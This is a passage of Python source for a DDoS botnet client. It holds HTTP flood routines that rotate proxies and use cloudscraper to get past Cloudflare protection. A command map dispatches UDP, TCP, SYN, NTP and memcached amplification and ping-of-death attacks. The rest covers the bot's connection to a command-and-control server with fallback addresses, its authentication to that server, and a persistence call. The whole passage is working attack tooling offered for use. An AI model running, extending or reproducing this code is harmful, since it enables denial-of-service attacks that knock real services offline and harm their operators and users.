            current_proxies = list(proxies_list) # Work with a copy for iteration

            proxy = None
            if current_proxies:
                proxy = random.choice(current_proxies)
                proxy_dict = {'http': 'http://' + proxy, 'https': 'https://' + proxy}
                session.proxies = proxy_dict # Apply proxy to the session
                if scraper: scraper.proxies = proxy_dict # Apply proxy to scraper session too
            elif cfbp in [0, 1]: # PROXY or NORMAL mode requires proxies
                 # print("No HTTP proxies available for this mode.") # Optional
                 session.proxies = {} # Ensure no proxy set
                 if scraper: scraper.proxies = {}
                 time.sleep(5) # Wait before retrying proxies
                 continue # Skip request if proxies are needed and none are available
            else: # Mode 2 (direct) or no proxies available for other modes
                 session.proxies = {} # Ensure no proxy set
                 if scraper: scraper.proxies = {} # Ensure no proxy set

            headers = {'User-Agent': rand_ua()}
            timeout = 10 # Shorter timeout for flood requests

            # --- Sending Logic ---
            response = None
            try:
                if scraper and cfbp in [1, 2]: # Use CloudScraper if available and mode allows
                     response = scraper.get(target, headers=headers, timeout=timeout)
                else: # Use plain requests session
                     response = session.get(target, headers=headers, timeout=timeout)

                if response is not None and response.status_code >= 200 and response.status_code <= 226:
                    for _ in range(100):
                        try:
                            if scraper and cfbp in [1, 2]:
                                 scraper.head(target, headers=headers, timeout=timeout)
                            else:
                                 session.head(target, headers=headers, timeout=timeout)
                        except requests.RequestException:
                             pass # Ignore individual errors in burst

            except requests.RequestException as e:
                # print(f"HTTPIO request error (proxy={proxy}): {e}") # Optional
                if proxy and proxy in proxies_list:
                    try: proxies_list.remove(proxy) # Remove potentially bad proxy
                    except ValueError: pass # Already removed
            except Exception as e:
                 print(f"HTTPIO process unexpected error: {e}") # Log unexpected error


        except Exception as e:
            # print(f"Top-level HTTPIO process error: {e}") # Optional
            pass

        # Original thread function had a sleep(1), let's add that
        time.sleep(1)


def httpio_method(target, times, threads, attack_type, http_proxies, requests_available, cloudscraper_available):
    if not requests_available or not Process:
        print("HTTPIO attack dependencies (requests, multiprocessing) not met.")
        return
    if attack_type.upper() in ['NORMAL'] and not cloudscraper_available:
         print("HTTPIO NORMAL mode requires cloudscraper.")
         # Continue, but cfbp will be set to 0 (plain requests)


    end_time = time.time() + int(times)

    cfbp = -1 # Use -1 for no proxy, 0 for PROXY (requests), 1 for NORMAL/CFBP (cloudscraper), 2 for direct

    # Determine cfbp mode based on attack_type
    if attack_type.upper() == 'PROXY':
        cfbp = 0 # Use plain requests session with proxies
        if not http_proxies:
            print("Warning: HTTPIO PROXY mode requires a list of HTTP proxies (http_proxies.txt). Running without proxies.")
            # Continue, _http_runner_process will handle empty list
    elif attack_type.upper() == 'NORMAL':
        cfbp = 1 # Use CloudScraper session with proxies (as per original code)
        if not cloudscraper_available:
            print("Warning: HTTPIO NORMAL mode requires cloudscraper. Running with plain requests instead.")
            # Continue, _http_runner_process will use session without scraper
            cfbp = 0 # Fallback to non-scraper mode if scraper is missing
        elif not http_proxies:
            print("Warning: HTTPIO NORMAL mode requires a list of HTTP proxies (http_proxies.txt). Running CloudScraper without proxies.")
            # Continue, _http_runner_process will handle empty list
    else:
         print(f"Warning: Unknown HTTPIO attack_type '{attack_type}'. Defaulting to direct (no proxies, with CloudScraper if available).")
         cfbp = 2 # Indicate no proxies, use CloudScraper if available

    processes = []
    # Cap processes to a reasonable number to avoid overwhelming the bot system, especially on IoT
    max_allowed_processes = 50 # Arbitrary cap, adjust as needed
    system_info_detected = detect_system() # Get system info again to check is_iot
    if system_info_detected.get('is_iot'): max_allowed_processes = 10 # Example lower cap for IoT

    num_processes = min(int(threads), max_allowed_processes) if int(threads) > 0 else 1
    if num_processes == 0: num_processes = 1 # Ensure at least one process if threads < 1

    print(f"Starting {num_processes} processes for HTTPIO attack on {target} for {times} seconds (Type: {attack_type.upper()})...")

    for i in range(num_processes):
        # Pass cfbp mode, the *loaded* proxies list, and capability flags to the process worker
        p = Process(target=_http_runner_process, args=(target, cfbp, http_proxies, requests_available, cloudscraper_available))
        processes.append(p)
        try:
             p.start()
        except Exception as e:
             print(f"Failed to start process {i}: {e}")


    # Wait for the duration of the attack
    time.sleep(int(times))

    # Terminate all processes
    print("Stopping HTTPIO processes...")
    for p in processes:
        if p.is_alive():
            try:
                p.terminate() # Request termination
                p.join(timeout=2) # Give it a moment to terminate
                if p.is_alive():
                    # If still alive, force kill
                    try: os.kill(p.pid, 9)
                    except Exception: pass # Ignore errors killing process
            except Exception as e:
                 # print(f"Error terminating process {p.pid}: {e}") # Optional
                 pass
    print("HTTPIO attack finished.")


# L7 Attacks that primarily use CloudScraper + Requests Session
# These methods do not take a proxy list as an argument based on the original snippets,
# implying they use CloudScraper directly or a requests session directly.
# CloudScraper can use session proxies, but the original code didn't load proxies for these specifically.
def httpcfb_method(url, port, secs, cloudscraper_available, requests_available):
    if not cloudscraper_available or not requests_available:
        print("HTTPCFB attack requires cloudscraper and requests.")
        return

    end_time = time.time() + int(secs)
    target_url_with_port = f"{url}:{port}"

    print(f"Starting HTTPCFB attack on {target_url_with_port} for {secs} seconds...")

    # Replicate original CFB logic using CloudScraper
    scraper = cloudscraper.create_scraper(sess=requests.Session()) if cloudscraper_available and requests_available else None
    session = requests.Session() if requests_available else None

    if not scraper and not session:
         print("HTTPCFB attack cannot run without cloudscraper or requests.")
         return

    while time.time() < end_time:
        try:
            headers = {'User-Agent': rand_ua()}
            # Send 1500 requests per outer loop iteration as per original code fragment
            for _ in range(1500):
                 try:
                    if scraper:
                         scraper.get(target_url_with_port, headers=headers, timeout=15)
                         scraper.head(target_url_with_port, headers=headers, timeout=15) # Original also sent HEAD
                    elif session:
                         session.get(target_url_with_port, headers=headers, timeout=15)
                         session.head(target_url_with_port, headers=headers, timeout=15)
                 except requests.RequestException:
                     pass # Ignore individual errors in burst
            # time.sleep(0.01) # Optional: small sleep between bursts

        except Exception as e:
            print(f"HTTPCFB attack thread error: {e}") # Log unexpected error
            pass # Ignore errors and continue


def httpstorm_method(ip, port, secs, cloudscraper_available, requests_available):
    if not cloudscraper_available or not requests_available:
        print("HTTPSTORM attack requires cloudscraper and requests.")
        return

    end_time = time.time() + int(secs)
    target_url_with_port = f"{ip}:{port}"

    print(f"Starting HTTPSTORM attack on {target_url_with_port} for {secs} seconds...")

    scraper = cloudscraper.create_scraper(sess=requests.Session()) if cloudscraper_available and requests_available else None
    session = requests.Session() if requests_available else None

    if not scraper and not session:
         print("HTTPSTORM attack cannot run without cloudscraper or requests.")
         return

    while time.time() < end_time:
        try:
            headers = {'User-Agent': rand_ua()}
            # Send 1500 requests per outer loop iteration as per original code fragment
            for _ in range(1500):
                 try:
                    # Original used requests.get/head AND scraper.get
                    if session:
                         session.get(target_url_with_port, headers=headers, timeout=15)
                         session.head(target_url_with_port, headers=headers, timeout=15)
                    if scraper:
                         scraper.get(target_url_with_port, headers=headers, timeout=15)
                 except requests.RequestException:
                     pass # Ignore individual errors in burst
            # time.sleep(0.01) # Optional: small sleep between bursts

        except Exception as e:
            print(f"HTTPSTORM attack thread error: {e}") # Log unexpected error
            pass # Ignore errors and continue


def httpget_method(ip, port, secs, cloudscraper_available, requests_available):
    if not cloudscraper_available or not requests_available:
        print("HTTPGET attack requires cloudscraper and requests.")
        return

    end_time = time.time() + int(secs)
    target_url_with_port = f"{ip}:{port}"

    print(f"Starting HTTPGET attack on {target_url_with_port} for {secs} seconds...")

    scraper = cloudscraper.create_scraper(sess=requests.Session()) if cloudscraper_available and requests_available else None
    session = requests.Session() if requests_available else None

    if not scraper and not session:
         print("HTTPGET attack cannot run without cloudscraper or requests.")
         return

    while time.time() < end_time:
        try:
            headers = {'User-Agent': rand_ua()}
            # Send 1500 requests per outer loop iteration as per original code fragment
            for _ in range(1500):
                 try:
                    # Original used requests.get AND scraper.get
                    if session:
                         session.get(target_url_with_port, headers=headers, timeout=15)
                    if scraper:
                         scraper.get(target_url_with_port, headers=headers, timeout=15)
                 except requests.RequestException:
                     pass # Ignore individual errors in burst
            # time.sleep(0.01) # Optional: small sleep between bursts

        except Exception as e:
            print(f"HTTPGET attack thread error: {e}") # Log unexpected error
            pass # Ignore errors and continue


# --- Command Mapping and Dispatch ---

# Map command names from CNC to local bot functions and their expected argument types.
# The types listed here define how the *raw command string* is parsed.
# External lists (proxies, servers) and capability flags (scapy_available, etc.) are
# implicitly added *after* parsing, based on the function being called.
# Format: "COMMAND_NAME": (function_reference, [arg1_type, arg2_type, ...])
COMMAND_MAP = {
    # CMD target port time size
    ".UDP": (udp_method, [str, int, int, int]),
    ".TCP": (tcp_method, [str, int, int, int]),
    ".TUP": (tup_method, [str, int, int, int]),
    ".HEX": (hex_method, [str, int, int, int]),
    ".JUNK": (junk_method, [str, int, int, int]),
    ".ROBLOX": (roblox_method, [str, int, int, int]),
    ".VSE": (vse_method, [str, int, int, int]),

    # CMD target port time (NTP/MEM target is SRC IP for spoofing)
    ".SYN": (syn_method, [str, int, int]), # CMD target port time
    ".NTP": (ntp_method, [str, int, int]), # CMD target(src_ip) port(dport) time
    ".MEM": (mem_method, [str, int, int]), # CMD target(src_ip) port(sport) time

    # CMD target time
    ".ICMP": (icmp_method, [str, int]), # CMD target time
    ".POD": (pod_method, [str, int]),   # CMD target time

    # L7 Commands (parsing based on typical usage: CMD target [port] time [other_args])
    # Assuming CMD target port time structure unless specified otherwise.
    ".HTTPGET": (httpget_method, [str, int, int]),       # CMD target port time
    ".HTTPSPOOF": (httpspoof_method, [str, int, int]), # CMD target port time -> Function takes url, port, timer
    ".HTTPSTORM": (httpstorm_method, [str, int, int]),   # CMD target port time
    ".HTTPCFB": (httpcfb_method, [str, int, int]),       # CMD target port time -> Function takes url, port, secs
    ".HTTPIO": (httpio_method, [str, int, int, str]),    # CMD target time threads type -> Function takes target, times, threads, attack_type
}

def parse_and_run_command(command_string):
    """Parses a command string received from CNC and runs the attack in a thread."""
    global attack_threads
    try:
        args = command_string.split(' ')
        if not args or not args[0].strip():
            return # Ignore empty commands

        command_name = args[0].strip().upper()

        if command_name in COMMAND_MAP:
            attack_func, arg_types = COMMAND_MAP[command_name]

            # Check if enough arguments are provided based on expected types
            # len(args) includes the command name itself, so compare len(args) - 1
            if len(args) - 1 < len(arg_types):
                print(f"Received incomplete command: {command_string}. Expected {len(arg_types)} args, got {len(args) - 1}.")
                return # Not enough arguments

            # Parse arguments and convert types
            parsed_args = []
            try:
                # Iterate through expected types, parsing from args starting at index 1
                for i, arg_type in enumerate(arg_types):
                    arg_value_str = args[i+1].strip() # Get the string value for this argument
                    if arg_type == str:
                        parsed_args.append(arg_value_str)
                    elif arg_type == int:
                        parsed_args.append(int(arg_value_str))
                    # Add other types if needed (e.g., float)
                    else:
                        print(f"Unknown argument type {arg_type} defined for command {command_name}. Skipping.")
                        return # Unknown type in map definition

            except (ValueError, IndexError) as e:
                print(f"Error parsing arguments for command {command_string}: {e}. Check command syntax.")
                return # Argument parsing failed

            # --- Append external lists and capability flags implicitly ---
            # Check the specific attack function and append necessary resources/flags.
            # The order matters and must match the function's definition.

            # Methods needing server lists (NTP, MEM) or proxy lists (HTTPSPOOF, HTTPIO)
            if attack_func == ntp_method:
                 parsed_args.append(external_lists['ntp_servers'])
            elif attack_func == mem_method:
                 parsed_args.append(external_lists['memsv'])
            elif attack_func == httpspoof_method:
                 parsed_args.append(external_lists['socks_proxies'])
            elif attack_func == httpio_method:
                 parsed_args.append(external_lists['http_proxies'])

            # Methods needing capability flags
            # Order matters! Append in the order the function expects them.
            if attack_func == icmp_method:
                 parsed_args.append(SCAPY_AVAILABLE)
                 parsed_args.append(ICMPLIB_AVAILABLE)
            elif attack_func in [pod_method, syn_method, ntp_method, mem_method]: # Scapy needed for L3/AMP spoofing
                 parsed_args.append(SCAPY_AVAILABLE)
            elif attack_func == httpspoof_method: # HTTPSPOOF needs socks, ssl, requests
                 parsed_args.append(SOCKS_AVAILABLE)
                 parsed_args.append(SSL_AVAILABLE)
                 parsed_args.append(REQUESTS_AVAILABLE)
            elif attack_func == httpio_method: # HTTPIO needs requests, cloudscraper
                 parsed_args.append(REQUESTS_AVAILABLE)
                 parsed_args.append(CLOUDSCRAPER_AVAILABLE)
            elif attack_func in [httpcfb_method, httpstorm_method, httpget_method]: # These need cloudscraper, requests
                 parsed_args.append(CLOUDSCRAPER_AVAILABLE)
                 parsed_args.append(REQUESTS_AVAILABLE)


            # Run the attack function in a new thread using the wrapper
            thread_name = f"{command_name}-{args[1]}-{int(time.time())}" # Create a descriptive name
            attack_thread = threading.Thread(target=_attack_thread_wrapper,
                                             args=(attack_func, *parsed_args), # Pass function and its arguments
                                             name=thread_name)
            attack_thread.daemon = True # Daemon threads exit when the main program exits
            attack_thread.start()
            attack_threads.append(attack_thread) # Track thread (optional)
            print(f"Dispatched command to thread: {command_string}")

        else:
            print(f"Received unknown command: {command_name}")

    except Exception as e:
        print(f"Error processing command string '{command_string}': {e}")
        import traceback
        traceback.print_exc() # Print traceback for parsing errors


# --- Bot Status Reporting ---
def print_bot_status():
    """Periodically prints bot status to the console."""
    while True:
        try:
            # Clean up finished threads from the tracked list
            global attack_threads
            attack_threads = [t for t in attack_threads if t.is_alive()]
            num_tracked_attack_threads = len(attack_threads)

            uptime_seconds = int(time.time() - start_time)
            # Format uptime as H:M:S
            m, s = divmod(uptime_seconds, 60)
            h, m = divmod(m, 60)
            uptime_str = f"{h:d}h {m:02d}m {s:02d}s"

            status = "Connected" if cnc_socket is not None else "Disconnected"
            current_target = "N/A"
            if cnc_socket:
                 try:
                      current_target = f"{cnc_socket.getpeername()[0]}:{cnc_socket.getpeername()[1]}"
                 except Exception:
                      pass # Socket might be closed or in bad state

            connection_type = "N/A"
            if cnc_socket:
                 # Determine if using Vercel or Fallback based on current target
                 sock_ip, sock_port = cnc_socket.getpeername()
                 if VERCEL_C2_ADDRESS and sock_ip == VERCEL_C2_ADDRESS and sock_port == VERCEL_C2_PORT:
                      connection_type = "Vercel"
                 elif sock_ip == FALLBACK_C2_ADDRESS and sock_port == FALLBACK_C2_PORT:
                      connection_type = "Fallback"
                 else:
                      connection_type = "Other" # Should not happen with current logic


            print(f"[STATUS] {status} | Target: {current_target} ({connection_type}) | Uptime: {uptime_str} | Active Attacks: {active_attacks_count} | Attack Threads: {num_tracked_attack_threads}")

        except Exception as e:
            print(f"[STATUS] Error printing status: {e}")
            import traceback
            traceback.print_exc() # Debug status thread error
        time.sleep(60) # Report status every 60 seconds


# --- CNC Connection Management ---

def fetch_vercel_info():
    """Attempts to fetch Vercel IP and Port."""
    global VERCEL_C2_ADDRESS, VERCEL_C2_PORT, LAST_VERCEL_CHECK_TIME
    LAST_VERCEL_CHECK_TIME = time.time() # Record check time

    if not REQUESTS_AVAILABLE:
        print("Requests not available, cannot fetch Vercel info.")
        VERCEL_C2_ADDRESS = None
        VERCEL_C2_PORT = None
        return False

    try:
        print("Attempting to fetch Vercel IP and Port...")
        ip_response = requests.get(VERCEL_IP_FETCH_URL, timeout=5)
        port_response = requests.get(VERCEL_PORT_FETCH_URL, timeout=5)

        new_ip = None
        new_port = None

        if ip_response.status_code == 200:
            new_ip = ip_response.text.strip()
            # Basic IP format validation
            if not re.match(r"^\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3}$", new_ip):
                 print(f"Warning: Invalid IP format received from Vercel: {new_ip}")
                 new_ip = None

        if port_response.status_code == 200:
            try:
                 new_port = int(port_response.text.strip())
                 if not (1 <= new_port <= 65535):
                      print(f"Warning: Invalid port number received from Vercel: {new_port}")
                      new_port = None
            except ValueError:
                 print(f"Warning: Invalid port format received from Vercel: {port_response.text.strip()}")
                 new_port = None

        if new_ip and new_port:
            VERCEL_C2_ADDRESS = new_ip
            VERCEL_C2_PORT = new_port
            print(f"Successfully fetched Vercel info: {VERCEL_C2_ADDRESS}:{VERCEL_C2_PORT}")
            return True
        else:
            print("Failed to fetch valid Vercel IP or Port.")
            VERCEL_C2_ADDRESS = None
            VERCEL_C2_PORT = None
            return False

    except requests.exceptions.RequestException as e:
        print(f"Error fetching Vercel info: {e}")
        VERCEL_C2_ADDRESS = None
        VERCEL_C2_PORT = None
        return False
    except Exception as e:
        print(f"Unexpected error fetching Vercel info: {e}")
        import traceback
        traceback.print_exc()
        VERCEL_C2_ADDRESS = None
        VERCEL_C2_PORT = None
        return False


def attempt_connect(address, port, timeout=10):
    """Attempts to create and return a connected socket."""
    s = None
    try:
        print(f"Attempting to connect to {address}:{port}...")
        s = socket.create_connection((address, port), timeout=timeout)
        s.setsockopt(socket.SOL_SOCKET, socket.SO_KEEPALIVE, 1)
        s.settimeout(None) # Set to blocking after connection
        print(f"Successfully connected to {address}:{port}.")
        return s
    except (socket.error, socket.timeout) as e:
        print(f"Connection to {address}:{port} failed: {e}")
        if s: s.close()
        return None
    except Exception as e:
        print(f"Unexpected error during connection to {address}:{port}: {e}")
        import traceback
        traceback.print_exc()
        if s: s.close()
        return None


def perform_authentication(sock):
    """Performs the bot authentication sequence on a connected socket."""
    try:
        print("Performing authentication...")
        sock.sendall(BOT_AUTH_STRING + b'\r\n')

        # Attempt to read prompts with timeout
        sock.settimeout(2)
        try: sock.recv(1024) # Read potential username prompt
        except socket.timeout: pass
        finally: sock.settimeout(None)

        sock.sendall(EXPECTED_BOT_USERNAME + b'\r\n')

        sock.settimeout(2)
        try: sock.recv(1024) # Read potential password prompt
        except socket.timeout: pass
        finally: sock.settimeout(None)

        # Send password bytes (exactly 5 bytes as expected by cnc.py)
        sock.sendall(EXPECTED_BOT_PASSWORD)

        print("Authentication sequence sent.")
        return True
    except (socket.error, socket.timeout) as e:
        print(f"Authentication failed: {e}")
        return False
    except Exception as e:
        print(f"Unexpected error during authentication: {e}")
        import traceback
        traceback.print_exc()
        return False


def vercel_check_background_thread():
    """Periodically checks Vercel when connected to the fallback."""
    global VERCEL_C2_ADDRESS, VERCEL_C2_PORT, USE_VERCEL, LAST_VERCEL_CHECK_TIME, cnc_socket
    while True:
        # Only run check if currently using fallback and it's time to check Vercel
        if not USE_VERCEL and (time.time() - LAST_VERCEL_CHECK_TIME) >= VERCEL_CHECK_INTERVAL:
            print("Background: Checking Vercel connection...")
            if fetch_vercel_info() and VERCEL_C2_ADDRESS and VERCEL_C2_PORT:
                 # Try connecting to Vercel briefly to confirm it's reachable
                 temp_sock = attempt_connect(VERCEL_C2_ADDRESS, VERCEL_C2_PORT, timeout=5)
                 if temp_sock:
                      print("Background: Vercel is reachable. Signaling switch.")
                      try: temp_sock.close() # Close test connection
                      except: pass
                      USE_VERCEL = True # Prioritize Vercel again
                      switch_connection_event.set() # Signal the main loop to switch
                 else:
                      print("Background: Vercel info fetched, but connection failed. Will retry later.")
            else:
                 print("Background: Failed to fetch Vercel info.")

        time.sleep(min(VERCEL_CHECK_INTERVAL, 60)) # Sleep, but wake up more often than interval to check flags/events


def connection_manager():
    """Manages connecting to the CNC using prioritized Vercel/Fallback logic."""
    global cnc_socket, USE_VERCEL, VERCEL_C2_ADDRESS, VERCEL_C2_PORT

    # Start the background Vercel check thread if not already running
    # Ensure only one such thread exists
    if not any(t.name == "VercelCheckThread" for t in threading.enumerate()):
        vercel_checker = threading.Thread(target=vercel_check_background_thread, name="VercelCheckThread")
        vercel_checker.daemon = True
        vercel_checker.start()

    # Main connection loop
    while True:
        switch_connection_event.clear() # Clear event before trying to connect

        if USE_VERCEL:
            # --- Attempt Vercel Connection ---
            if VERCEL_C2_ADDRESS is None or VERCEL_C2_PORT is None:
                # Need to fetch Vercel info first if not available
                fetch_vercel_info()

            if VERCEL_C2_ADDRESS and VERCEL_C2_PORT:
                print(f"Attempting primary Vercel connection to {VERCEL_C2_ADDRESS}:{VERCEL_C2_PORT}...")
                sock = attempt_connect(VERCEL_C2_ADDRESS, VERCEL_C2_PORT, timeout=10)
                if sock:
                    if perform_authentication(sock):
                        print("Connected and authenticated via Vercel.")
                        cnc_socket = sock
                        USE_VERCEL = True # Confirm using Vercel
                        return # Connection successful, exit manager

            # If Vercel failed or info not available, fall back
            print("Vercel connection failed. Falling back to hardcoded...")
            USE_VERCEL = False
            LAST_VERCEL_CHECK_TIME = time.time() # Reset check time after failure

        # --- Attempt Fallback Connection ---
        print(f"Attempting fallback connection to {VERCEL_C2_ADDRESS}:{VERCEL_C2_PORT}...")
        sock = attempt_connect(VERCEL_C2_ADDRESS, VERCEL_C2_PORT, timeout=10)
        if sock:
             if perform_authentication(sock):
                 print("Connected and authenticated via Fallback.")
                 cnc_socket = sock
                 USE_VERCEL = False # Confirm using Fallback
                 # Background thread is now responsible for checking Vercel
                 return # Connection successful, exit manager

        # --- Both Failed ---
        print("Both Vercel and Fallback connections failed. Retrying...")
        # Wait before the next connection attempt cycle
        time.sleep(15) # Wait 15 seconds before trying again


def main_bot_loop():
    """Main loop for the bot to manage connection and receive commands."""
    global cnc_socket

    # 1. Initial Setup (Persistence, List Loading, Status Thread)
    print("Bot starting initial setup...")
    system_info = detect_system()
    print(f"System Info: OS={system_info['os']}, Arch={system_info['architecture']}, Distro={system_info['distro']}, IoT={system_info['is_iot']}")
    add_persistence(system_info)
    load_external_lists()

    # Start status reporting thread
    status_thread = threading.Thread(target=print_bot_status, name="StatusThread")
    status_thread.daemon = True
    status_thread.start()

    # 2. Connection and Command Loop
    while True:
        # If not connected, use the connection manager to establish one
        if cnc_socket is None:
            connection_manager() # This function blocks until a connection is made

        # Check if the connection manager successfully connected
        if cnc_socket is None:
             # This should not happen if connection_manager blocks until success
             # but as a safeguard, wait and loop again.
             time.sleep(5)
             continue

        # Main receive loop while connected
        try:
            # Set a short timeout for receiving commands.
            # This allows the main loop to check the `switch_connection_event` periodically.
            cnc_socket.settimeout(0.5)
            while cnc_socket is not None: # Inner loop while connected
                try:
                    data = cnc_socket.recv(1024) # Adjust buffer size if needed
                    if not data:
                        # No data received means connection is likely closed by remote host
                        print("Disconnected from CNC (no data received).")
                        break # Exit inner loop

                    # Decode and process received commands
                    command_string = data.decode('utf-8', errors='ignore').strip()

                    if not command_string:
                         continue # Ignore empty strings

                    if command_string.upper() == 'PING':
                        try:
                            cnc_socket.sendall(b'PONG\r\n')
                            # print("Responded to PING with PONG.") # Optional debug
                        except socket.error as e:
                             print(f"Error sending PONG: {e}. Disconnecting.")
                             break # Exit inner loop on send error
                        continue # Processed PING, get next command

                    # Handle other commands
                    parse_and_run_command(command_string)

                except socket.timeout:
                    # Receive timed out, connection is still active.
                    # Check if we need to switch connection (e.g., Vercel is back)
                    if switch_connection_event.is_set():
                         print("Switch connection event received. Disconnecting current connection.")
                         break # Exit inner loop to reconnect via manager
                    # Otherwise, continue waiting for data
                    pass
                except ConnectionResetError:
                    print("Connection reset by peer.")
                    break # Exit inner loop
                except socket.error as e:
                    print(f"Socket error during receive: {e}.")
                    break # Exit inner loop
                except Exception as e:
                    print(f"Unexpected error during receive or command processing: {e}.")
                    import traceback
                    traceback.print_exc()
                    # Don't break the inner loop on unexpected errors unless severe,
                    # try to keep receiving. However, for stability, breaking might be safer.
                    # Let's break to trigger reconnection logic.
                    break


            # After breaking the inner loop (due to disconnect or switch event)
            print("Closing current CNC connection.")
            try:
                 if cnc_socket: cnc_socket.close()
            except: pass
            cnc_socket = None
            # Outer loop will now call connection_manager() to reconnect

        except Exception as e:
            # This outer try-except catches errors *before* entering the receive loop
            # after connection, or errors in the connection management itself
            print(f"Critical error in main connection/receive loop: {e}")
            import traceback
            traceback.print_exc()
            try:
                 if cnc_socket: cnc_socket.close()
            except: pass
            cnc_socket = None
            time.sleep(5) # Wait before attempting to reconnect again


# --- Main Execution Block ---

if __name__ == "__main__":
    print("Bot starting...")
    try:
        main_bot_loop()
    except KeyboardInterrupt:
        print("\nBot stopped manually.")
    except Exception as e:
        print(f"Critical error in main execution: {e}")
        import traceback
        traceback.print_exc()
